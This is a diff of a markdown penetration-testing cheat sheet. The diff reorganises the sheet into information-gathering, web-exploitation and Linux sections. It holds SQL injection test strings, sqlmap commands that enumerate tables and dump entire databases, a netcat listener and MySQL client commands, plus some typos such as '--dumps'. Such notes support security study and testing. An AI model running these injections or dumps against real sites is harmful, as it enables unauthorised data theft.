@@ -60,7 +60,11 @@
 >-  nc -l 1234
 
 
+## Inforamtion Gathering 
+
 &nbsp;
+## Web Exploitation 
+
 ### Manual SQL
 
 >- ' and 1=1; -- -  | True returns something
@@ -71,7 +75,43 @@
 
 >- ' or 1=2; -- - 
 
+
 &nbsp;
+### MySql:
+
+mysql -u userName -pPassword -h HOSTIP DBName
+
+- Change or select a database :
+
+	>> use NameofDatabse
+
+- Show database tables(columns) 
+
+	>>> show tables;
+
+- Show the rows of the tables:
+	
+	>>> Select * from tableNAME
+
+&nbsp;
+
+### SQLmap 
+
+
+>- sqlmap -u "URL" -- > qquick enumeration fro the URL
+
+
+>- sqlmap -u "URL" -b --> get the banner 
+
+
+>- sqlmap -u "URL" --tables --> to get the tables 
+
+
+>-  sqlmap -u "URL" --dumps --> dumps all the database
+
+&nbsp;
+
+## Linux Commands
 ### Tmux:
 
 > - Ctrl+b " - split pane horizontally.
@@ -92,35 +132,6 @@
 
 &nbsp;
 
-### MySql:
-
-mysql -u userName -pPassword -h HOSTIP DBName
-
-- Change or select a database :
-
-	>> use NameofDatabse
-
-- Show database tables(columns) 
-
-	>>> show tables;
-
-- Show the rows of the tables:
-	
-	>>> Select * from tableNAME
-
-&nbsp;
-### SQLmap 
-
-
->- sqlmap -u "URL" -- > qquick enumeration fro the URL
-
-
->- sqlmap -u "URL" -b --> get the banner 
-
-
->- sqlmap -u "URL" --tables --> to get the tables 
-
->-  sqlmap -u "URL" --dumps --> dumps all the database
 
 &nbsp;
 
